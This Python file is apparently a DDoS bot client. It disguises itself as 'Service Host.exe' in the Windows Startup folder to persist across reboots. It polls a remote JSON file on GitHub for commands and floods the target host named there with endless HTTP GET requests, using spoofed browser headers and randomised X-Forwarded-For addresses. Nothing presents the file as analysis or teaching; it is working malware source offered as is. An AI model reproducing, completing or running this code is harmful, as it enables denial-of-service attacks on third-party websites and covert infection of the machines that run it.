import os
import sys
import ssl
import time
import json
import random
import shutil
import psutil
import requests
import threading

class _:

    def __init__(self, Config):
        self.CurrentFile = __file__
        self.Config = Config

    def Setup(self):
        StartupPath = os.path.join(os.path.join(os.getenv('APPDATA'), r"Microsoft\Windows\Start Menu\Programs\Startup"), "Service Host.exe")
        if not os.path.exists(StartupPath):
            shutil.copy(sys.executable, StartupPath)

    def ValidateSingleProcess(self):
        for Process in psutil.process_iter(['name']):
            if Process.info['name'] == "Service Host_.exe":
                sys.exit(1)
        return False

    def Listen(self):
        
        if json.loads(requests.get(self.Config).text)['ATK'] == "0":
            return True
        else:
            print(False)
        
    def ATK(self):

        Website = json.loads(requests.get(self.Config).text)['HOST']

        while True:
            
            headers = {
                "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36",
                'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9',
                'Accept-Encoding': 'gzip, deflate, br',
                'Accept-Language': 'en-US,en;q=0.9',
                'Cache-Control': 'no-cache',
                'Connection': 'keep-alive',
                'DNT': '1', 
                'Pragma': 'no-cache',
                'Referer': 'https://www.google.com/',
                'Sec-Fetch-Dest': 'document',
                'Sec-Fetch-Mode': 'navigate',
                'Sec-Fetch-Site': 'cross-site',
                'Sec-Fetch-User': '?1',
                'Upgrade-Insecure-Requests': '1',
                'TE': 'Trailers',
                'X-Requested-With': 'XMLHttpRequest',
                'X-Forwarded-For': f'192.168.{random.randint(0, 255)}.{random.randint(0, 255)}'
            }
            response = requests.get(Website, headers=headers)
        
    def Main(self):

        self.Setup()
        self.ValidateSingleProcess()   

        while True:

            time.sleep(1)

            if self.Listen():

                if not hasattr(self, 'ATKThread') or not self.ATKThread.is_alive():
                    self.ATKThread = threading.Thread(target=self.ATK)
                    self.ATKThread.daemon = True
                    self.ATKThread.start()
            else:

                if hasattr(self, 'ATKThread') and self.ATKThread.is_alive():
                    self.ATKThread.join(timeout=1)



if __name__ == "__main__":
    _("https://raw.githubusercontent.com/ToughLuck5562/Lora___TestCommand/refs/heads/main/main.json").Main()